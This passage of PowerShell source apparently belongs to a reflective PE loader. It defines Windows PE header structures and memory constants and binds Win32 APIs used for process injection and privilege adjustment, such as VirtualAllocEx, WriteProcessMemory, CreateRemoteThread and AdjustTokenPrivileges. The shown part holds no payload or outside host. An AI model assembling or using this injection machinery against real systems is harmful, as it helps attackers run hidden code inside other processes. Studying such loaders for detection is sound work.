        ($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
        ($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
        ($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
        ($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
        ($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
        ($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
        ($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
        ($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
        ($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
        ($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
        ($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
        ($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
        ($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
        $IMAGE_OPTIONAL_HEADER32 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $IMAGE_OPTIONAL_HEADER32

        #Struct IMAGE_NT_HEADERS64
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS64', $Attributes, [System.ValueType], 264)
        $TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
        $TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER64, 'Public') | Out-Null
        $IMAGE_NT_HEADERS64 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $IMAGE_NT_HEADERS64
        
        #Struct IMAGE_NT_HEADERS32
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS32', $Attributes, [System.ValueType], 248)
        $TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
        $TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER32, 'Public') | Out-Null
        $IMAGE_NT_HEADERS32 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $IMAGE_NT_HEADERS32

        #Struct IMAGE_DOS_HEADER
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DOS_HEADER', $Attributes, [System.ValueType], 64)
        $TypeBuilder.DefineField('e_magic', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_cp', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_ss', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_sp', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_csum', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_ip', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_cs', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_ovno', [UInt16], 'Public') | Out-Null

        $e_resField = $TypeBuilder.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
        $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $FieldArray = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
        $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 4))
        $e_resField.SetCustomAttribute($AttribBuilder)

        $TypeBuilder.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null

        $e_res2Field = $TypeBuilder.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
        $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 10))
        $e_res2Field.SetCustomAttribute($AttribBuilder)

        $TypeBuilder.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
        $IMAGE_DOS_HEADER = $TypeBuilder.CreateType()    
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $IMAGE_DOS_HEADER

        #Struct IMAGE_SECTION_HEADER
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_SECTION_HEADER', $Attributes, [System.ValueType], 40)

        $nameField = $TypeBuilder.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
        $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 8))
        $nameField.SetCustomAttribute($AttribBuilder)

        $TypeBuilder.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        $IMAGE_SECTION_HEADER = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $IMAGE_SECTION_HEADER

        #Struct IMAGE_BASE_RELOCATION
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_BASE_RELOCATION', $Attributes, [System.ValueType], 8)
        $TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
        $IMAGE_BASE_RELOCATION = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $IMAGE_BASE_RELOCATION

        #Struct IMAGE_IMPORT_DESCRIPTOR
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_IMPORT_DESCRIPTOR', $Attributes, [System.ValueType], 20)
        $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
        $IMAGE_IMPORT_DESCRIPTOR = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $IMAGE_IMPORT_DESCRIPTOR

        #Struct IMAGE_EXPORT_DIRECTORY
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_EXPORT_DIRECTORY', $Attributes, [System.ValueType], 40)
        $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('Base', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
        $IMAGE_EXPORT_DIRECTORY = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY
        
        #Struct LUID
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)
        $TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null
        $LUID = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID
        
        #Struct LUID_AND_ATTRIBUTES
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType], 12)
        $TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null
        $TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
        $LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $LUID_AND_ATTRIBUTES
        
        #Struct TOKEN_PRIVILEGES
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)
        $TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null
        $TOKEN_PRIVILEGES = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $TOKEN_PRIVILEGES

        return $Win32Types
    }

    Function Get-Win32Constants
    {
        $Win32Constants = New-Object System.Object
        
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
        $Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
        $Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
        $Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0
        
        return $Win32Constants
    }

    Function Get-Win32Functions
    {
        $Win32Functions = New-Object System.Object
        
        $VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
        $VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
        $VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value $VirtualAlloc
        
        $VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
        $VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
        $VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualAllocEx -Value $VirtualAllocEx
        
        $memcpyAddr = Get-ProcAddress msvcrt.dll memcpy
        $memcpyDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
        $memcpy = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memcpyAddr, $memcpyDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name memcpy -Value $memcpy
        
        $memsetAddr = Get-ProcAddress msvcrt.dll memset
        $memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
        $memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name memset -Value $memset
        
        $LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
        $LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
        $LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $LoadLibrary
        
        $GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
        $GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
        $GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $GetProcAddress
        
        $GetProcAddressIntPtrAddr = Get-ProcAddress kernel32.dll GetProcAddress #This is still GetProcAddress, but instead of PowerShell converting the string to a pointer, you must do it yourself
        $GetProcAddressIntPtrDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([IntPtr])
        $GetProcAddressIntPtr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressIntPtrAddr, $GetProcAddressIntPtrDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressIntPtr -Value $GetProcAddressIntPtr
        
        $VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
        $VirtualFreeDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
        $VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value $VirtualFree
        
        $VirtualFreeExAddr = Get-ProcAddress kernel32.dll VirtualFreeEx
        $VirtualFreeExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
        $VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeExAddr, $VirtualFreeExDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value $VirtualFreeEx
        
        $VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
        $VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
        $VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect
        
        $GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA
        $GetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr])
        $GetModuleHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetModuleHandleAddr, $GetModuleHandleDelegate)
        $Win32Functions | Add-Member NoteProperty -Name GetModuleHandle -Value $GetModuleHandle
        
        $FreeLibraryAddr = Get-ProcAddress kernel32.dll FreeLibrary
        $FreeLibraryDelegate = Get-DelegateType @([Bool]) ([IntPtr])
        $FreeLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FreeLibraryAddr, $FreeLibraryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $FreeLibrary
        
        $OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
        $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
        $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $OpenProcess
        
        $WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
        $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [UInt32]) ([UInt32])
        $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $WaitForSingleObject
        
        $WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
        $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory
        
        $ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory
        $ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ReadProcessMemoryAddr, $ReadProcessMemoryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $ReadProcessMemory
        
        $CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
        $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $CreateRemoteThread
        
        $GetExitCodeThreadAddr = Get-ProcAddress kernel32.dll GetExitCodeThread
        $GetExitCodeThreadDelegate = Get-DelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        $GetExitCodeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetExitCodeThreadAddr, $GetExitCodeThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $GetExitCodeThread
        
        $OpenThreadTokenAddr = Get-ProcAddress Advapi32.dll OpenThreadToken
        $OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        $OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $OpenThreadToken
        
        $GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread
        $GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])
        $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $GetCurrentThread
        
        $AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges
        $AdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        $AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $AdjustTokenPrivileges
        
        $LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA
        $LookupPrivilegeValueDelegate = Get-DelegateType @([String], [String], [IntPtr]) ([Bool])
        $LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $LookupPrivilegeValue
        
        $ImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf
        $ImpersonateSelfDelegate = Get-DelegateType @([Int32]) ([Bool])
        $ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $ImpersonateSelf
        
        # NtCreateThreadEx is only ever called on Vista and Win7. NtCreateThreadEx is not exported by ntdll.dll in Windows XP
        if (([Environment]::OSVersion.Version -ge (New-Object 'Version' 6,0)) -and ([Environment]::OSVersion.Version -lt (New-Object 'Version' 6,2))) {
            $NtCreateThreadExAddr = Get-ProcAddress NtDll.dll NtCreateThreadEx
            $NtCreateThreadExDelegate = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
            $NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtCreateThreadExAddr, $NtCreateThreadExDelegate)
            $Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $NtCreateThreadEx
        }
        
        $IsWow64ProcessAddr = Get-ProcAddress Kernel32.dll IsWow64Process
        $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $IsWow64Process
        
        $CreateThreadAddr = Get-ProcAddress Kernel32.dll CreateThread
        $CreateThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name CreateThread -Value $CreateThread
        
        return $Win32Functions
    }
    #####################################

            
    #####################################
    ########### HELPERS ############
    #####################################

    #Powershell only does signed arithmetic, so if we want to calculate memory addresses we have to use this function
    #This will add signed integers as if they were unsigned integers so we can accurately calculate memory addresses
    Function Sub-SignedIntAsUnsigned
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $Value1,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $Value2
        )
        
        [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
        [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
        [Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

        if ($Value1Bytes.Count -eq $Value2Bytes.Count)
        {
            $CarryOver = 0
            for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
            {
                $Val = $Value1Bytes[$i] - $CarryOver
                #Sub bytes
                if ($Val -lt $Value2Bytes[$i])
                {
                    $Val += 256
                    $CarryOver = 1
                }
                else
                {
                    $CarryOver = 0
                }
                
                
                [UInt16]$Sum = $Val - $Value2Bytes[$i]

                $FinalBytes[$i] = $Sum -band 0x00FF
            }
        }
        else
        {
            Throw "Cannot subtract bytearrays of different sizes"
        }
        
        return [BitConverter]::ToInt64($FinalBytes, 0)
    }
    

    Function Add-SignedIntAsUnsigned
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $Value1,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $Value2
        )
        
        [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
        [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
        [Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

        if ($Value1Bytes.Count -eq $Value2Bytes.Count)
        {
            $CarryOver = 0
            for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
            {
                #Add bytes
                [UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver

                $FinalBytes[$i] = $Sum -band 0x00FF
                
                if (($Sum -band 0xFF00) -eq 0x100)
                {
                    $CarryOver = 1
                }
                else
                {
                    $CarryOver = 0
                }
            }
        }
        else
        {
            Throw "Cannot add bytearrays of different sizes"
        }
        
        return [BitConverter]::ToInt64($FinalBytes, 0)
    }
    

    Function Compare-Val1GreaterThanVal2AsUInt
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $Value1,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $Value2
        )
        
        [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
